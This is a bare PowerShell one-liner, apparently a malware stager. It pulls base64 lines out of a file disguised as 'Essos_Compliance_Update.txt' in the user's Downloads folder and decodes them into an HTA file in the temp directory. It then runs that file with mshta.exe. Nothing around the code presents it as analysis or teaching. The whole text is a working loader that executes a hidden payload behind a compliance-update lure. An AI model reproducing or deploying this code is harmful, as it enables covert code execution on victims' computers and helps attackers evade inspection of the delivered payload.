$f=Join-Path $env:USERPROFILE Downloads\Essos_Compliance_Update.txt;$s=((Get-Content $f|Where-Object{$_ -match '^[A-Za-z0-9+/=]+$'}|Out-String) -replace '[\r\n]','');$bt=[Text.Encoding]::ASCII.GetBytes($s);$x=New-Object Security.Cryptography.FromBase64Transform;$m=New-Object IO.MemoryStream;$c=New-Object Security.Cryptography.CryptoStream($m,$x,[Security.Cryptography.CryptoStreamMode]::Write);$c.Write($bt,0,$bt.Length);$c.FlushFinalBlock();$tb=Join-Path $env:TEMP Essos_Compliance_Update.bin;[IO.File]::WriteAllBytes($tb,$m.ToArray());$th=Join-Path $env:TEMP Essos_Compliance_Update.hta;if(Test-Path $th){Remove-Item $th -Force};Rename-Item $tb $th;mshta.exe $th
